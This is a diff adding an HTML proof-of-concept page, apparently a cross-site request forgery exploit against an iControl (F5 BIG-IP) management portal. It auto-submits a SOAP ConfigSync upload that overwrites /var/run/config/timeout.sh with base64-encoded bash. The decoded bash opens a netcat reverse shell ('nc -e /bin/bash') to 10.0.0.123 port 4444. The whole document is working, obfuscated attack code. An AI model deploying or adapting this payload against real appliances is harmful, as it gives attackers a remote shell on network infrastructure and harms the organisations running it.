@@ -1,0 +1,25 @@
+
+      <form id="form" method="post" action="https://10.0.0.136/iControl/iControlPortal.cgi" enctype="text/plain">
+        <textarea id="payload" name="&lt;!--">--&gt;<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:con="urn:iControl:System/ConfigSync">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <con:upload_file soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+        <file_name xsi:type="xsd:string">/var/run/config/timeout.sh</file_name>
+         <file_context xsi:type="urn:System.ConfigSync.FileTransferContext" xmlns:urn="urn:iControl">
+            <!--type: Common.OctetSequence-->
+            <file_data xsi:type="urn:Common.OctetSequence">IyEvYmluL2Jhc2gKZWNobyAiSXdvaklGUklTVk1nU1ZNZ1FVNGdRVlZVVHkxSFJVNUZVa0ZVUlVRZ1JrbE1SU0F0SUVSUElFNVBWQ0JGUkVsVUlTRWhDaU1LSXlCVmMyVWdkR2hsSUhSdGMyZ2djMmhsYkd3Z2RYUnBiR2wwZVNCMGJ5QnRZV3RsSUdOb1lXNW5aWE1nZEc4Z2RHaGxJSE41YzNSbGJTQmpiMjVtYVdkMWNtRjBhVzl1TGdvaklFWnZjaUJ0YjNKbElHbHVabTl5YldGMGFXOXVMQ0J6WldVZ2RHMXphQ0F0WVNCb1pXeHdJSE41Y3lCemMyaGtMZ3BRVTA5VlZEMWdMMkpwYmk5d2N5QXRMVzV2TFdobFlXUmxjbk1nTFc4Z2RIUjVJQzBrSkdBS2FXWWdXeUFpSkh0UVUwOVZWRG93T2pOOUlpQTlQU0FpZEhSNUlpQmRPeUIwYUdWdUNpQWdJQ0JsZUhCdmNuUWdWRTFQVlZROU1BcGxiSE5sQ2lBZ0lDQmxlSEJ2Y25RZ1ZFMVBWVlE5TUFwbWFRbz0iIHwgYmFzZTY0IC1kID4gIi92YXIvcnVuL2NvbmZpZy90aW1lb3V0LnNoIgpuYyAtZSAvYmluL2Jhc2ggMTAuMC4wLjEyMyA0NDQ0IDI+JjEgPiAvZGV2L251bGwgJg==</file_data>
+            <chain_type xsi:type="urn:Common.FileChainType">FILE_FIRST_AND_LAST</chain_type>
+         </file_context>
+      </con:upload_file>
+   </soapenv:Body>
+</soapenv:Envelope>
+</textarea>
+        <input type=submit>
+      </form>
+
+      <script>
+        setTimeout(function() {
+          document.getElementById("form").submit();
+        }, 1000);
+      </script>
+    
